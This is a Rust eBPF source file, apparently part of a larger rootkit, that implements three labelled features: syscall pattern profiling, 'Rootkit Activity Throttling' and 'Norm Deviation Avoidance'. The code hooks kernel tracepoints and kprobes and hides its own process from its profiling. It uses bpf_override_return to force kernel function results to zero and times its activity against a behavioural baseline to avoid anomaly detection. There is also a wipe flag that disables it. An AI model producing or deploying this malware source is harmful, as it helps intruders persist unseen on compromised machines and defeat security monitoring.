use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns},
    macros::{kprobe, tracepoint},
    programs::{ProbeContext, TracePointContext},
    EbpfContext,
};
use common::{
    EventHeader, EVENT_ACTIVITY_THROTTLED, EVENT_BEHAVIOR_PROFILED, EVENT_NORM_DEVIATION_AVOIDED,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 64: Syscall Pattern Profiling
// ──────────────────────────────────────────────

#[tracepoint]
pub fn shadow_syscall_profile(ctx: TracePointContext) -> u32 {
    try_syscall_profile(&ctx).unwrap_or_default()
}

fn try_syscall_profile(ctx: &TracePointContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let syscall_nr: u64 = unsafe { ctx.read_at(8).unwrap_or(0u64) };

    let bucket = (syscall_nr % 16) as u32;
    if let Some(counter) = unsafe { SYSCALL_HISTOGRAM.get_ptr_mut(bucket) } {
        unsafe { *counter += 1 };
    }

    let now = unsafe { bpf_ktime_get_ns() };
    let profile_interval: u64 = 1_000_000_000;

    let last_profile = match unsafe { BEHAVIOR_BASELINE.get(0) } {
        Some(&v) => v,
        None => 0,
    };

    if now.wrapping_sub(last_profile) > profile_interval {
        if let Some(slot) = unsafe { BEHAVIOR_BASELINE.get_ptr_mut(0) } {
            unsafe { *slot = now };
        }

        let event = EventHeader {
            event_type: EVENT_BEHAVIOR_PROFILED,
            pid,
            timestamp_ns: now,
            context: syscall_nr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 65: Rootkit Activity Throttling
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_activity_throttle(ctx: ProbeContext) -> u32 {
    try_activity_throttle(&ctx).unwrap_or_default()
}

fn try_activity_throttle(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let now = unsafe { bpf_ktime_get_ns() };

    let throttle_until = match unsafe { THROTTLE_STATE.get(0) } {
        Some(&v) => v,
        None => 0,
    };

    if now < throttle_until {
        let event = EventHeader {
            event_type: EVENT_ACTIVITY_THROTTLED,
            pid,
            timestamp_ns: now,
            context: throttle_until,
        };
        let _ = EVENTS.output(&event, 0);

        #[cfg(target_arch = "bpf")]
        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_override_return(ctx.as_ptr() as *mut _, 0u64);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 66: Norm Deviation Avoidance
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_norm_avoidance(ctx: ProbeContext) -> u32 {
    try_norm_avoidance(&ctx).unwrap_or_default()
}

fn try_norm_avoidance(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let now = unsafe { bpf_ktime_get_ns() };

    let baseline_avg = match unsafe { BEHAVIOR_BASELINE.get(1) } {
        Some(&v) => v,
        None => return Ok(0),
    };

    if baseline_avg == 0 {
        return Ok(0);
    }

    let last_action = match unsafe { THROTTLE_STATE.get(1) } {
        Some(&v) => v,
        None => 0,
    };

    let interval = now.wrapping_sub(last_action);

    if interval < baseline_avg / 2 {
        let new_throttle = now + baseline_avg;
        if let Some(slot) = unsafe { THROTTLE_STATE.get_ptr_mut(0) } {
            unsafe { *slot = new_throttle };
        }

        let event = EventHeader {
            event_type: EVENT_NORM_DEVIATION_AVOIDED,
            pid,
            timestamp_ns: now,
            context: interval,
        };
        let _ = EVENTS.output(&event, 0);
    }

    if let Some(slot) = unsafe { THROTTLE_STATE.get_ptr_mut(1) } {
        unsafe { *slot = now };
    }

    Ok(0)
}
